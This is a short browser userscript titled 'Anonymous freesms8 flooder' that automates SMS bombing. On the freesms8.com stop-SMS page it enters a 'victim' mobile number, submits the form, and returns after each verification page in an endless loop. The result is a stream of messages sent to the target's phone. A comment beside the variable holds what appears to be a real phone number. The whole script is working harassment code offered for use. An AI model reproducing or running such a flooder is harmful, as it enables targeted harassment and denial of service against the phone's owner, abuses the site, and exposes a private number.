// ==UserScript==
// @name          Anonymous freesms8 flooder
// @namespace     Yash
// @description   flooder sms
// @include       http://*freesms8.com/*
// @credits       One
// ==/UserScript==

var victim=0 //9828060994
var delay=1000; // Enter delay in milliseconds if required

if(document.location=="http://www.freesms8.com/StopFreesms.aspx"||document.location=="http://freesms8.com/StopFreesms.aspx")
{
document.getElementById('ctl00_BodyPlaceHolder_MobileTb').value=victim;
document.getElementById('ctl00_BodyPlaceHolder_SubmitBt').click();
}
if(document.location=="http://www.freesms8.com/StopFreesms_verify.aspx"||document.location=="http://freesms8.com/SStopFreesms_verify.aspx")
setTimeout("document.location='http://www.freesms8.com/StopFreesms.aspx'",delay);